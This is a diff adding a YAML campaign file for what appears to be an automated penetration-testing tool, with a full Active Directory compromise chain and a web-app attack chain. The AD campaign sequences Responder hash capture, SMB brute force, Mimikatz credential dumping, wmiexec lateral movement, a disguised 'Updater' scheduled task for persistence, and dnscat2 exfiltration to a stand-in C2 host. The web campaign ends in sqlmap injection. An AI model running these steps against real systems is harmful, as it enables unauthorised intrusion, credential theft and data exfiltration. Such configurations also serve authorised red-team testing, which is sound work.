@@ -1,0 +1,244 @@
+campaigns:
+  - name: "full-ad-compromise"
+    description: "Campaña completa de compromiso de Active Directory"
+    phases:
+      - name: "Reconnaissance"
+        parallel: true
+        on_failure: "continue"
+        tasks:
+          - id: "nmap-scan"
+            name: "Escaneo de puertos"
+            tool: "nmap"
+            command: "nmap"
+            args: ["-sV", "-sC", "-O", "-p-", "{TARGET_IP}"]
+            timeout: 300
+            retries: 2
+            depends_on: []
+            output_handling:
+              save_output: true
+              parse_json: false
+          
+          - id: "enum4linux"
+            name: "Enumeración SMB"
+            tool: "enum4linux"
+            command: "enum4linux"
+            args: ["-a", "{TARGET_IP}"]
+            timeout: 120
+            retries: 1
+            depends_on: []
+            output_handling:
+              save_output: true
+              parse_json: false
+
+      - name: "Initial Access"
+        parallel: false
+        on_failure: "stop"
+        tasks:
+          - id: "responder"
+            name: "Captura de hashes LLMNR/NBT-NS"
+            tool: "responder"
+            command: "responder"
+            args: ["-I", "eth0", "-wrfv"]
+            timeout: 180
+            retries: 0
+            depends_on: []
+            output_handling:
+              save_output: true
+              parse_json: false
+              notify_on_match: "hash_captured"
+
+          - id: "crackmapexec-smb"
+            name: "Ataque de fuerza bruta SMB"
+            tool: "crackmapexec"
+            command: "crackmapexec"
+            args: ["smb", "{TARGET_IP}", "-u", "{USERNAME}", "-p", "{PASSWORD}"]
+            timeout: 60
+            retries: 1
+            depends_on: ["responder"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+      - name: "Privilege Escalation"
+        parallel: true
+        on_failure: "continue"
+        tasks:
+          - id: "mimikatz"
+            name: "Extracción de credenciales con Mimikatz"
+            tool: "mimikatz"
+            command: "mimikatz"
+            args: ["privilege::debug", "sekurlsa::logonpasswords", "exit"]
+            timeout: 30
+            retries: 2
+            depends_on: []
+            output_handling:
+              save_output: true
+              parse_json: false
+
+          - id: "bloodhound"
+            name: "Recolección de datos AD"
+            tool: "bloodhound"
+            command: "bloodhound-python"
+            args: ["-d", "{TARGET_DOMAIN}", "-u", "{USERNAME}", "-p", "{PASSWORD}", "-ns", "{TARGET_IP}", "-c", "All"]
+            timeout: 120
+            retries: 1
+            depends_on: ["crackmapexec-smb"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+      - name: "Lateral Movement"
+        parallel: false
+        on_failure: "continue"
+        tasks:
+          - id: "wmi-exec"
+            name: "Ejecución remota vía WMI"
+            tool: "wmiexec"
+            command: "wmiexec.py"
+            args: ["{DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP}"]
+            timeout: 60
+            retries: 1
+            depends_on: ["mimikatz"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+          - id: "ps-exec"
+            name: "Ejecución con PowerShell remoto"
+            tool: "powershell"
+            command: "Invoke-Command"
+            args: ["-ComputerName", "{TARGET_IP}", "-ScriptBlock", "{Get-Process}"]
+            timeout: 30
+            retries: 1
+            depends_on: []
+            output_handling:
+              save_output: true
+              parse_json: false
+
+      - name: "Persistence"
+        parallel: false
+        on_failure: "continue"
+        tasks:
+          - id: "schtasks"
+            name: "Crear tarea programada persistente"
+            tool: "schtasks"
+            command: "schtasks"
+            args: ["/create", "/tn", "Updater", "/tr", "C:\\Windows\\System32\\calc.exe", "/sc", "daily", "/f"]
+            timeout: 30
+            retries: 2
+            depends_on: ["wmi-exec"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+      - name: "Exfiltration"
+        parallel: false
+        on_failure: "continue"
+        tasks:
+          - id: "dnscat2"
+            name: "Exfiltración por DNS"
+            tool: "dnscat2"
+            command: "dnscat2"
+            args: ["--dns", "domain={C2_SERVER}", "--exec", "ls"]
+            timeout: 60
+            retries: 0
+            depends_on: ["ps-exec"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+    config:
+      target_ip: "192.168.1.10"
+      target_domain: "contoso.local"
+      credentials:
+        username: "Administrator"
+        password: "P@ssw0rd"
+        domain: "CONTOSO"
+      c2_server: "c2.attacker.com"
+      report_path: "/opt/kalinova/reports/campaign_report.html"
+      stealth_mode: true
+      max_concurrent: 3
+
+  - name: "web-app-pentest"
+    description: "Auditoría automatizada de aplicación web"
+    phases:
+      - name: "Discovery"
+        parallel: true
+        on_failure: "continue"
+        tasks:
+          - id: "nmap-web"
+            name: "Escaneo de puertos web"
+            tool: "nmap"
+            command: "nmap"
+            args: ["-p", "80,443,8080,8443", "-sV", "{TARGET_IP}"]
+            timeout: 60
+            retries: 1
+            depends_on: []
+            output_handling:
+              save_output: true
+              parse_json: false
+
+          - id: "gobuster"
+            name: "Enumeración de directorios"
+            tool: "gobuster"
+            command: "gobuster"
+            args: ["dir", "-u", "http://{TARGET_IP}", "-w", "/usr/share/wordlists/dirb/common.txt"]
+            timeout: 120
+            retries: 1
+            depends_on: ["nmap-web"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+      - name: "Scanning"
+        parallel: true
+        on_failure: "continue"
+        tasks:
+          - id: "nikto"
+            name: "Escaneo de vulnerabilidades web"
+            tool: "nikto"
+            command: "nikto"
+            args: ["-h", "http://{TARGET_IP}"]
+            timeout: 180
+            retries: 0
+            depends_on: ["gobuster"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+          - id: "wapiti"
+            name: "Escaneo de vulnerabilidades OWASP"
+            tool: "wapiti"
+            command: "wapiti"
+            args: ["-u", "http://{TARGET_IP}", "--scope", "folder"]
+            timeout: 300
+            retries: 0
+            depends_on: ["gobuster"]
+            output_handling:
+              save_output: true
+              parse_json: false
+
+      - name: "Exploitation"
+        parallel: false
+        on_failure: "stop"
+        tasks:
+          - id: "sqlmap"
+            name: "Inyección SQL automática"
+            tool: "sqlmap"
+            command: "sqlmap"
+            args: ["-u", "http://{TARGET_IP}/page?id=1", "--batch", "--dbs"]
+            timeout: 120
+            retries: 2
+            depends_on: ["nikto"]
+            output_handling:
+              save_output: true
+              parse_json: true
+
+    config:
+      target_ip: "192.168.1.20"
+      target_domain: "webapp.local"
+      credentials: null
+      c2_server: ""
+      report_path: "/opt/kalinova/reports/web_report.html"
+      stealth_mode: false
+      max_concurrent: 2
